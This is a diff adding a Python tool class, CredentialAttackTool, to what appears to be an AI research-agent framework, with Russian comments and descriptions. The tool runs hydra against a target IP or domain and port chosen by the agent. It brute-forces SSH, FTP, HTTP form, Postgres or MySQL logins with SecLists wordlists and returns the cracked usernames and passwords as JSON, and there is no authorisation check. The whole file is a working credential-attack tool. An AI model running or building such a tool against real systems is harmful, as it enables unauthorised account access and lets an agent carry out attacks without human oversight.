@@ -1,0 +1,107 @@
+from __future__ import annotations
+import asyncio
+import json
+import logging
+import re
+from typing import TYPE_CHECKING, ClassVar, Literal
+
+from pydantic import Field
+from sgr_deep_research.core.base_tool import BaseTool
+
+if TYPE_CHECKING:
+    from sgr_deep_research.core.models import ResearchContext
+
+logger = logging.getLogger(__name__)
+
+SECLISTS_BASE_PATH = "/usr/share/seclists"
+WORDLISTS = {
+    "logins": {
+        "small": f"{SECLISTS_BASE_PATH}/Usernames/top-usernames-shortlist.txt",
+        "medium": f"{SECLISTS_BASE_PATH}/Usernames/Names/names.txt",
+    },
+    "passwords": {
+        "small": f"{SECLISTS_BASE_PATH}/Passwords/Common-Credentials/10-million-password-list-top-100.txt",
+        "medium": f"{SECLISTS_BASE_PATH}/Passwords/Common-Credentials/10-million-password-list-top-500.txt",
+    }
+}
+
+class CredentialAttackTool(BaseTool):
+    """
+    Выполняет атаку методом перебора (брутфорс) для подбора учетных данных
+    к указанному сервису с помощью утилиты hydra. Использует стандартные
+    словари из коллекции SecLists.
+    """
+    tool_name: ClassVar[str] = "credentialattacktool"
+
+    reasoning: str = Field(description="Причина, по которой необходимо выполнить атаку на учетные данные.")
+    target: str = Field(description="IP-адрес или доменное имя цели.")
+    port: int = Field(description="Порт целевого сервиса.")
+    service_protocol: Literal['ssh', 'ftp', 'http-post-form', 'postgres', 'mysql'] = Field(
+        description="Протокол сервиса, который будет атакован (например, 'ssh', 'ftp')."
+    )
+    wordlist_size: Literal['small', 'medium'] = Field(
+        default='small',
+        description="Размер словарей для атаки. 'small' для быстрой проверки, 'medium' для более тщательной."
+    )
+
+    async def __call__(self, context: ResearchContext) -> str:
+        """
+        Запускает hydra со словарями из SecLists и парсит результат.
+        """
+        logger.info(f"Запуск CredentialAttackTool на {self.target}:{self.port} (словари: {self.wordlist_size})")
+
+        login_filepath = WORDLISTS["logins"].get(self.wordlist_size)
+        password_filepath = WORDLISTS["passwords"].get(self.wordlist_size)
+
+        if not login_filepath or not password_filepath:
+            return json.dumps({"status": "error", "message": "Неверный размер словаря."})
+
+        command = [
+            'hydra',
+            '-L', login_filepath,
+            '-P', password_filepath,
+            '-s', str(self.port),
+            '-t', '4',
+            self.target,
+            self.service_protocol
+        ]
+
+        try:
+            process = await asyncio.create_subprocess_exec(
+                *command,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            stdout, stderr = await process.communicate()
+
+            error_message = stderr.decode('utf-8', errors='ignore').strip()
+            if "not found" in error_message.lower() or "ERROR" in error_message:
+                 logger.error(f"Ошибка выполнения hydra: {error_message}")
+                 return json.dumps({"status": "error", "message": error_message})
+
+            output = stdout.decode('utf-8', errors='ignore')
+            return self._parse_hydra_output(output)
+
+        except FileNotFoundError:
+            msg = "Команда 'hydra' не найдена. Убедитесь, что hydra установлена и доступна в PATH."
+            logger.error(msg)
+            return json.dumps({"status": "error", "message": msg})
+
+    def _parse_hydra_output(self, output: str) -> str:
+        """Парсит текстовый вывод hydra для поиска успешных комбинаций."""
+        pattern = re.compile(r"\[\d*\]\[{}\].*host: {}.*login: (.*) password: (.*)".format(self.service_protocol, re.escape(self.target)))
+
+        found_credentials = []
+        for line in output.splitlines():
+            match = pattern.search(line)
+            if match:
+                login = match.group(1).strip()
+                password = match.group(2).strip()
+                found_credentials.append({"login": login, "password": password})
+
+        if found_credentials:
+            logger.info(f"Успех! Найдено {len(found_credentials)} учетных данных для {self.target}:{self.port}")
+            return json.dumps({"status": "success", "credentials": found_credentials}, indent=2)
+        else:
+            logger.info(f"Атака на {self.target}:{self.port} не дала результатов.")
+            return json.dumps({"status": "failure", "message": "Учетные данные не найдены."}, indent=2)
